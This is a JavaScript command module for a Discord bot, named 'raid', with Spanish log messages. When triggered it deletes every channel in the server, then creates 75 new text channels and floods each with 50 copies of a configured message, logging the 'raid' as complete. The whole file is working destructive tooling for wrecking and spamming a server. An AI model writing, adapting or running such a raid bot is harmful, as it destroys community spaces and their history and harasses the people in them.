const { ChannelType } = require('discord.js');
require('colors');

var { Message, Name } = require('../config.json');

module.exports = {
    name: 'raid',

    async execute(client, message) {
        async function deleteChannels(guild) {
            try {
                const channels = guild.channels.cache;
                const tasks = Array.from(channels.values()).map(channel => (channel.delete()));
                await Promise.all(tasks);
            } catch {
                return;
            }
        }

        async function createChannel(guild) {
            try {
                const tasks = [];
                for (let i = 1; i <= 75; i++) {
                    tasks.push((async () => {
                        const channel = await guild.channels.create({
                            name: Name,
                            type: ChannelType.GuildText
                        });
                        const messages = [];
                        for (let j = 1; j <= 50; j++) {
                            messages.push(channel.send(Message));
                        }

                        await Promise.all(messages);
                        })());
                    }
                await Promise.all(tasks);
            } catch {
                return;
            }
        }

        await message.delete();
        let channels = (await message.guild.channels.fetch()).size;
        await deleteChannels(message.guild);
        console.log(" [+] ".green + ` Canales borrados: ${channels}. `);
        tasks = Array.from(createChannel(message.guild));
        Promise.all(tasks);
        console.log(" [+] ".green + ` Raideo a ${message.guild.name} completado.`.white);
    }
}